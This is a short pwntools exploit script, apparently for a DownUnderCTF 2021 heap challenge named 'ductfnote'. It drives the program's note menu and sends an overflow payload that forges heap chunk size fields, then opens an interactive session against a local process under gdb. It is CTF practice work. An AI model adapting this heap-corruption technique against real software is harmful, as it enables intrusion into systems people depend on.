from pwn import *

#r = remote("pwn-2021.duc.tf", 31917)
r = process("./ductfnote")
gdb.attach(r)
r.recvuntil(b'>>')


def create(size):
	r.sendline(b'1')
	r.recvuntil(b'Size:')
	r.sendline(str(size))
	r.recvuntil(b'>>')

def show():
	r.sendline(b'2')
	r.recvuntil(b">>")

def edit(something):
	r.sendline(b'3')
	r.sendline(something)
	r.recvuntil(b'>>')

def delete():
	r.sendline(b'4')


create(0x7f)

payload = b"a"*0x80 + b'b'*(0x60-12 - 0x8) + p64(0) + p64(0x21) + p64(0x500)
#payload = b"a"*0x7f
edit(payload)


create(0x450)
edit(b'b'*0x100)

show()

r.interactive()
